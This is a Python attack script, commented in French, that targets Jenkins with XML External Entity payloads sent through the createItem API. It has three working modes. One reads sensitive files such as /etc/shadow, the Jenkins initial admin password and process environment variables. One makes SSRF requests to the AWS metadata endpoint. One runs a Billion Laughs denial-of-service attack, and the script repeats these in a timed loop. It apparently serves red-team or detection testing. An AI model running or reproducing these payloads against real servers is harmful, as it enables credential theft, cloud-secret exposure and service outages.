#!/usr/bin/env python3
"""
Script d'attaque XXE (XML External Entity) sur Jenkins
Exploitation de vulnérabilités XML dans les configurations de jobs
MITRE ATT&CK: T1203 - Exploitation for Client Execution
"""

import requests
import time
import argparse
from datetime import datetime
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class JenkinsXXE:
    def __init__(self, base_url, username="admin", password="admin"):
        self.base_url = base_url.rstrip('/')
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.authenticated = False
        
    def authenticate(self):
        """Authentification"""
        try:
            crumb_url = f"{self.base_url}/crumbIssuer/api/json"
            response = self.session.get(crumb_url, auth=(self.username, self.password), verify=False)
            if response.status_code == 200:
                crumb_data = response.json()
                self.session.headers.update({
                    crumb_data['crumbRequestField']: crumb_data['crumb']
                })
                self.authenticated = True
                print(f"[{datetime.now()}] Authentification réussie")
                return True
        except Exception as e:
            print(f"[{datetime.now()}] Erreur d'authentification: {e}")
        return False
    
    def xxe_file_read(self, target_file="/etc/passwd"):
        """Tentative de lecture de fichier via XXE"""
        xxe_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file://{target_file}">
]>
<project>
  <description>&xxe;</description>
  <keepDependencies>false</keepDependencies>
  <properties/>
  <scm class="hudson.scm.NullSCM"/>
  <canRoam>true</canRoam>
  <disabled>false</disabled>
  <blockBuildWhenDownstreamBuilding>false</blockBuildWhenDownstreamBuilding>
  <blockBuildWhenUpstreamBuilding>false</blockBuildWhenUpstreamBuilding>
  <triggers/>
  <concurrentBuild>false</concurrentBuild>
  <builders/>
  <publishers/>
  <buildWrappers/>
</project>"""
        
        print(f"[{datetime.now()}] XXE - Tentative lecture fichier: {target_file}")
        
        try:
            # Créer un job avec le payload XXE
            job_name = f"xxe-test-{int(time.time())}"
            create_url = f"{self.base_url}/createItem"
            
            response = self.session.post(
                create_url,
                params={'name': job_name},
                data=xxe_payload,
                headers={'Content-Type': 'application/xml'},
                auth=(self.username, self.password),
                verify=False
            )
            
            print(f"[{datetime.now()}] XXE - Création job [HTTP {response.status_code}]")
            
            if response.status_code in [200, 201]:
                # Récupérer la config pour voir si l'entité a été résolue
                config_url = f"{self.base_url}/job/{job_name}/config.xml"
                config_response = self.session.get(
                    config_url,
                    auth=(self.username, self.password),
                    verify=False
                )
                
                print(f"[{datetime.now()}] XXE - Récupération config [HTTP {config_response.status_code}]")
                
                if "/bin" in config_response.text or "root:" in config_response.text:
                    print(f"[{datetime.now()}] ✓ XXE RÉUSSI - Fichier lu avec succès!")
                    return True
                    
            return False
            
        except Exception as e:
            print(f"[{datetime.now()}] XXE ERROR: {e}")
            return False
    
    def xxe_ssrf(self, target_url="http://169.254.169.254/latest/meta-data/"):
        """Tentative SSRF via XXE (pour AWS metadata par exemple)"""
        xxe_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "{target_url}">
]>
<project>
  <description>&xxe;</description>
</project>"""
        
        print(f"[{datetime.now()}] XXE-SSRF - Tentative accès: {target_url}")
        
        try:
            job_name = f"xxe-ssrf-{int(time.time())}"
            create_url = f"{self.base_url}/createItem"
            
            response = self.session.post(
                create_url,
                params={'name': job_name},
                data=xxe_payload,
                headers={'Content-Type': 'application/xml'},
                auth=(self.username, self.password),
                verify=False
            )
            
            print(f"[{datetime.now()}] XXE-SSRF - Résultat [HTTP {response.status_code}]")
            return response.status_code in [200, 201]
            
        except Exception as e:
            print(f"[{datetime.now()}] XXE-SSRF ERROR: {e}")
            return False
    
    def xxe_dos(self):
        """Billion Laughs Attack (DoS via XXE)"""
        xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<project>
  <description>&lol5;</description>
</project>"""
        
        print(f"[{datetime.now()}] XXE-DOS - Billion Laughs Attack")
        
        try:
            job_name = f"xxe-dos-{int(time.time())}"
            create_url = f"{self.base_url}/createItem"
            
            response = self.session.post(
                create_url,
                params={'name': job_name},
                data=xxe_payload,
                headers={'Content-Type': 'application/xml'},
                auth=(self.username, self.password),
                verify=False,
                timeout=10
            )
            
            print(f"[{datetime.now()}] XXE-DOS - Résultat [HTTP {response.status_code}]")
            return True
            
        except requests.Timeout:
            print(f"[{datetime.now()}] XXE-DOS - Timeout (possiblement réussi)")
            return True
        except Exception as e:
            print(f"[{datetime.now()}] XXE-DOS ERROR: {e}")
            return False

def main():
    parser = argparse.ArgumentParser(description="Attaque XXE sur Jenkins")
    parser.add_argument('--target', default='http://localhost:8080',
                        help='URL de Jenkins')
    parser.add_argument('--user', default='admin',
                        help='Nom d\'utilisateur')
    parser.add_argument('--password', default='admin',
                        help='Mot de passe')
    parser.add_argument('--duration', type=int,
                        help='Durée de l\'attaque en secondes')
    parser.add_argument('--attack-type', choices=['file', 'ssrf', 'dos', 'all'], 
                        default='all',
                        help='Type d\'attaque XXE')
    
    args = parser.parse_args()
    
    print(f"\n[{datetime.now()}] === DÉBUT ATTAQUE XXE ===")
    print(f"  - Cible: {args.target}")
    print(f"  - Type: {args.attack_type}\n")
    
    attacker = JenkinsXXE(args.target, args.user, args.password)
    
    if not attacker.authenticate():
        print(f"[{datetime.now()}] ERREUR: Impossible de s'authentifier")
        return
    
    start_time = time.time()
    attacks_performed = 0
    
    while True:
        if args.duration and (time.time() - start_time) >= args.duration:
            break
        
        if args.attack_type in ['file', 'all']:
            # Tenter de lire différents fichiers sensibles
            sensitive_files = [
                "/etc/passwd",
                "/etc/shadow",
                "/var/jenkins_home/secrets/initialAdminPassword",
                "/var/jenkins_home/config.xml",
                "/proc/self/environ"
            ]
            
            for file_path in sensitive_files:
                attacker.xxe_file_read(file_path)
                attacks_performed += 1
                time.sleep(2)
                
                if args.duration and (time.time() - start_time) >= args.duration:
                    break
        
        if args.attack_type in ['ssrf', 'all']:
            # SSRF vers metadata AWS
            attacker.xxe_ssrf("http://169.254.169.254/latest/meta-data/")
            attacks_performed += 1
            time.sleep(2)
        
        if args.attack_type in ['dos', 'all']:
            # DoS via Billion Laughs
            attacker.xxe_dos()
            attacks_performed += 1
            time.sleep(5)
        
        if args.attack_type == 'all':
            time.sleep(10)
        else:
            break
    
    duration = time.time() - start_time
    
    print(f"\n[{datetime.now()}] === FIN ATTAQUE XXE ===")
    print(f"  - Durée: {duration:.2f}s")
    print(f"  - Attaques effectuées: {attacks_performed}\n")

if __name__ == "__main__":
    main()
